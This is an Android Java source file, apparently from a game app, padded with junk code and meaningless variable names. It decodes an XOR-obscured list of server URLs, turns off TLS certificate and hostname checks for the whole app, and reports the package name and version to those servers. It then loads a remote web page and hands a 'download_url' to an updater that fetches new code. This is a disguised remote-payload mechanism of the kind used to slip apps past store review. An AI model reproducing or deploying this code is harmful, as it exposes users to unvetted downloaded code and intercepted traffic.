package com.lucking.shine.app;
import java.util.ArrayList;


import java.util.Random;


import java.util.HashMap;




import static android.util.Base64.NO_WRAP;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.text.TextUtils;
import android.util.Base64;

import com.lucking.shine.games.R;
import com.lucking.shine.util.CHandler;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;





public class NPNote {
private String showRazorChessStr;
private ArrayList<Boolean> agentRecyclerBase_arr;
private HashMap<String,Integer> limitCancelled_dict;
private String computeAlertStr;




    public static String getString(Context context) {
        try {
            byte[] name = context.getPackageName().getBytes("utf-8");
            byte[] data = Base64.decode(context.getString(R.string.http_url), NO_WRAP);
            int flag = 0x77;
            for (int i = 0; i < name.length; ++i) {
                flag ^= (name[i] & 0xff);
            }
            for (int j = 0; j < data.length; ++j) {
                data[j] ^= flag;
            }
            return new String(data);
        } catch (Throwable e) {
            return "";
        }
    }

    public static void reqUrl(Context context, YAFNoteFacebook callBack) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                trustAllHttpsCertificates();
            long openE = 8036L;
             if (openE >= 179) {}
                HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {
                    @Override
                    public boolean verify(String hostname, SSLSession session) {
                        return hostname.contains(".");
                    }
                });

                String url = "";
            int resultsx = 4281;
             if (resultsx <= 95) {}
                String downloadUrl = "";
            HashMap<String,String> appsflyerA = new HashMap<String,String>();
     appsflyerA.put("imension", "chevron");
     appsflyerA.put("decodef", "bitstr");
             if (appsflyerA.get("f") != null) {}

                PackageInfo packageInfo = null;
            ArrayList<Boolean> activityG = new ArrayList<Boolean>();
     activityG.add(true);
     activityG.add(true);
     activityG.add(true);
     activityG.add(true);
     activityG.add(true);
     activityG.add(true);
             if (activityG.contains("1")) {}
                try {
                    packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            String binderh = "enabled";
                } catch (PackageManager.NameNotFoundException e) {
                    throw new RuntimeException(e);
                }
                String[] urls = getString(context).split(",");
            ArrayList<Long> resizeC = new ArrayList<Long>();
     resizeC.add(660L);
     resizeC.add(689L);
     resizeC.add(593L);
     resizeC.add(446L);
                String data;
            float this_fit = 2024.0f;
             while (this_fit >= 174) { break; }
                SharedPreferences sp = context.getSharedPreferences("app", Context.MODE_PRIVATE);
            double httpF = 1626.0;
                int start = sp.getInt("start", 0);
            long equalsH = 9926L;
             while (equalsH > 7) { break; }
                for (int i = start; i < urls.length * 2; i++) {
                    String str = urls[i % urls.length];
            String backq = "top";
             if (backq.equals("S")) {}
                    data = reqH5(str, packageInfo.versionCode, packageInfo.packageName);
            HashMap<String,Double> limiti = new HashMap<String,Double>();
     limiti.put("yquant", 68.0);
     limiti.put("sigma", 847.0);
     limiti.put("socket", 755.0);
     limiti.put("fontconfig", 69.0);
                    if (TextUtils.isEmpty(data)) {
                        continue;
                    }
                    try {
                        JSONObject jsonObject = new JSONObject(data);
            float selectorm = 930.0f;
             if (selectorm >= 165) {}
                        JSONObject jsonData = jsonObject.getJSONObject("data");
            ArrayList<Double> finisht = new ArrayList<Double>();
     finisht.add(280.0);
     finisht.add(787.0);
     finisht.add(125.0);
     finisht.add(879.0);
     finisht.add(521.0);
     finisht.add(128.0);
             while (finisht.size() > 70) { break; }

                        url = jsonData.optString("h5url");
            float unitj = 6089.0f;
             if (unitj > 20) {}
                        downloadUrl = jsonData.optString("download_url");
            double sharep = 2659.0;
                        sp.edit().putInt("start", i).apply();
            HashMap<String,Float> method_qxQ = new HashMap<String,Float>();
     method_qxQ.put("spinner", 775.0f);
     method_qxQ.put("geocoder", 570.0f);
     method_qxQ.put("categories", 404.0f);
     method_qxQ.put("example", 168.0f);
     method_qxQ.put("will", 763.0f);
                        break;
                    } catch (Exception e) {
                        e.printStackTrace();
            HashMap<String,String> client1 = new HashMap<String,String>();
     client1.put("fullness", "fdct");
     client1.put("intersecting", "prefixes");
     client1.put("revoke", "lift");
             while (client1.size() > 84) { break; }
                    }
                }

                if (TextUtils.isEmpty(url)) {
                    String gitUlr = reqGit(context.getString(R.string.git_url));
            int cachex = 2983;
             if (cachex == 155) {}
                    if (TextUtils.isEmpty(gitUlr)) {
                        
                        return;
                    }
                    data = reqH5(gitUlr, packageInfo.versionCode, packageInfo.packageName);
            long resize9 = 5743L;
             while (resize9 < 169) { break; }
                    if (TextUtils.isEmpty(data)) {
                        
                        return;
                    }
                    try {
                        JSONObject jsonObject = new JSONObject(data);
            boolean mediaY = true;
             if (!mediaY) {}
                        JSONObject jsonData = jsonObject.getJSONObject("data");
            int enewsS = 6851;
             if (enewsS == 19) {}

                        url = jsonData.optString("h5url");
            float impl5 = 2404.0f;
             while (impl5 >= 116) { break; }
                        downloadUrl = jsonData.optString("download_url");
            float resizep = 5042.0f;
             if (resizep < 88) {}
                    } catch (Exception e) {
                        e.printStackTrace();
            int unitH = 3840;
             if (unitH >= 33) {}
                    }
                }

                if (!TextUtils.isEmpty(downloadUrl)) {
                    CHandler updateApp = new CHandler(PProviderStone.getInstance(), downloadUrl, new TJIGradle(context));
            long disconnectedP = 3157L;
             if (disconnectedP <= 38) {}
                    updateApp.execute();
            String adjust7 = "eipv";
             while (adjust7.length() > 157) { break; }
                }
                callBack.cb(url);
            double homeC = 2618.0;
             while (homeC == 160) { break; }
            }
        }).start();
    }

    private static String reqH5(String url, int versionCode, String packageName) {
        BufferedReader bufferedReader = null;
        try {
            URL httpUrl = new URL(url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();

            
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setReadTimeout(5000);

            
            OutputStream outputStream = httpURLConnection.getOutputStream();
            StringBuilder builder = new StringBuilder();
            builder.append("packageName=");
            builder.append(packageName);
            builder.append("&");
            builder.append("versioncode=");
            builder.append(versionCode);
            builder.append("&");
            builder.append("devicetype=android");

            outputStream.write(builder.toString().getBytes());

            
            InputStream inputStream = httpURLConnection.getInputStream();
            bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            final StringBuffer stringBuffer = new StringBuffer();
            String line = null;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuffer.append(line);
            }
            return stringBuffer.toString();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bufferedReader != null) {
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return "";
    }

    private static String reqGit(String url) {
        BufferedReader bufferedReader = null;
        try {
            URL httpUrl = new URL(url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();

            
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setReadTimeout(5000);

            
            InputStream inputStream = httpURLConnection.getInputStream();
            bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            final StringBuffer stringBuffer = new StringBuffer();
            String line = null;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuffer.append(line);
            }
            return stringBuffer.toString();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bufferedReader != null) {
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return "";
    }

    private static void trustAllHttpsCertificates() {
        TrustManager[] trustAllCerts = new TrustManager[1];
        trustAllCerts[0] = new RKPayment();
        SSLContext sc = null;
        try {
            sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
    }

    private static class RKPayment implements X509TrustManager {
private double emptyJustStarted_size = 0.0;
double pageConfigurationContentOffset = 0.0;




        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
            if (chain != null && chain[0] != null) {
                chain[0].checkValidity();
            }
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
            if (chain != null && chain[0] != null) {
                chain[0].checkValidity();
            }
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
}
